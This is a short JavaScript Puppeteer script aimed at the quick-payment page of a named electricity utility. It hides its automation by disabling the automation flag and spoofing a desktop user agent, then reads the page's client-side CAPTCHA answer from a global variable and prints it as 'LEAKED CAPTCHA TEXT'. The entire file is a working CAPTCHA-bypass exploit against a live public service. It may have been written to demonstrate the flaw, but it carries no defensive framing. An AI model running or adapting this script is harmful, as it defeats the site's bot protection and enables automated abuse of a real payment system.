const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-blink-features=AutomationControlled',
      '--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    ]
  });
  
  const page = await browser.newPage();
  try {
    await page.goto('https://mescom.org.in/mescom/main/quick-payment', { 
      waitUntil: 'domcontentloaded',
      timeout: 60000 
    });
  } catch (e) {
    console.log("Navigation warning:", e.message);
  }
  await new Promise(r => setTimeout(r, 8000));

  const captchaText = await page.evaluate(() => {
    return window.code || (typeof code !== 'undefined' ? code : null);
  });

  console.log("LEAKED CAPTCHA TEXT:", captchaText);

  await browser.close();
})();
